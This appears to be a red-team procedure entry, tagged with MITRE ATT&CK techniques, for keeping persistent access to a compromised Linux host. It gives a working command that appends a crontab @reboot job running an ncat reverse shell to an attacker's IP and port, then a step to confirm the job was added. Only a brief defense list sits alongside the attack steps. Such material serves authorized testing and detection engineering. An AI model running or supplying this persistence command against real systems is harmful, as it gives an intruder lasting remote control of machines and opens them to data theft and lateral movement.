---
id: 008b964a-b994-40c4-b850-4b8b279e0f62
name: Linux-Crontab-Reverse-Shell-Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:17.954297+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Scheduled Task|T1053 - Scheduled Task]]'
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques:
  - '[[sub-techniques/DNS|T1071.004 - DNS]]'
tags:
  - '[[tags/Crontab-Reverse-Shell]]'
  - '[[tags/Linux-Persistence]]'
commands:
  - '[[commands/add-linux-crontab-reverse-shell-on-reboot]]'
platforms:
  - Linux
tools:
  - '[[tools/ncat]]'
validated: true
---

# Linux-Crontab-Reverse-Shell-Persistence

## Summary

This procedure establishes persistent access to a compromised Linux system by adding a cron job that triggers a reverse shell connection to an attacker-controlled server upon system reboot. It leverages the crontab utility to schedule the execution of a reverse shell using ncat, ensuring the attacker regains shell access even after reboots or session disruptions.

## Description

In this persistence technique, an attacker with initial shell access on a Linux target schedules a reverse shell via crontab to run automatically on reboot. The cron job includes a delay to allow system stabilization before establishing the connection, after which ncat executes a bash shell back to the attacker's listener. This method is stealthy as it uses a legitimate system scheduling tool and blends with normal system processes. It is effective for maintaining long-term access in environments where initial footholds may be lost due to reboots, logouts, or detection of active sessions. The technique assumes the target has ncat installed or available, and the attacker knows their external IP and listening port. Success enables remote command execution, data exfiltration, and lateral movement from the persistent foothold.

## Requirements

1. Shell access to the target Linux system (local or remote).
2. ncat tool installed on the target (part of nmap package).
3. Knowledge of the attacker's external IP address and listening port.
4. Network connectivity from the target to the attacker's IP/port (outbound TCP allowed).

## Defense

- Regularly audit crontab entries across all user accounts using tools like cron-apt or custom scripts to detect unauthorized jobs.
- Implement host-based intrusion detection systems (HIDS) to monitor changes to crontab files and unexpected outbound connections.
- Enforce principle of least privilege by restricting cron job creation to administrators and using AppArmor/SELinux to limit ncat execution.
- Monitor network traffic for anomalous outbound connections to non-standard ports, especially post-reboot.

## Objectives

1. Schedule a reverse shell to execute automatically on system reboot for persistent access.
2. Establish a command shell on the attacker machine for remote control of the target.
3. Maintain access despite system reboots or session interruptions.
4. Enable further post-exploitation activities like data exfiltration or lateral movement.

## Instructions

### Step 1: Add Crontab Entry for Reverse Shell

**Context**: Append a new cron job to the current user's crontab that runs on reboot, waits for system stability, and initiates a reverse TCP shell using ncat to the attacker's listener. This ensures persistence without overwriting existing jobs.

**Command** ([[commands/add-linux-crontab-reverse-shell-on-reboot]]):
```bash
(crontab -l ; echo "@reboot sleep 200 && ncat $_ATTACKER_IP $_ATTACKER_PORT -e /bin/bash") | crontab 2> /dev/null
```

> This command lists the existing crontab, appends the new job (sleep 200 seconds to allow boot completion, then ncat connects to the specified IP and port, executing /bin/bash), and reloads the crontab. The 2> /dev/null suppresses error output if no existing crontab exists. Replace $_ATTACKER_IP and $_ATTACKER_PORT with actual values before execution. Expected: No output on success; the job is silently added.

### Step 2: Verify Crontab Addition

**Context**: Confirm the cron job has been successfully added by listing the current crontab entries. This step validates the persistence mechanism is in place.

**Command**:
```bash
crontab -l
```

> This displays all scheduled jobs for the current user. Look for the @reboot line with the sleep and ncat commands. Expected: Output includes the new job, e.g., "@reboot sleep 200 && ncat 192.168.1.100 4444 -e /bin/bash". If absent, re-run Step 1 and check for errors.
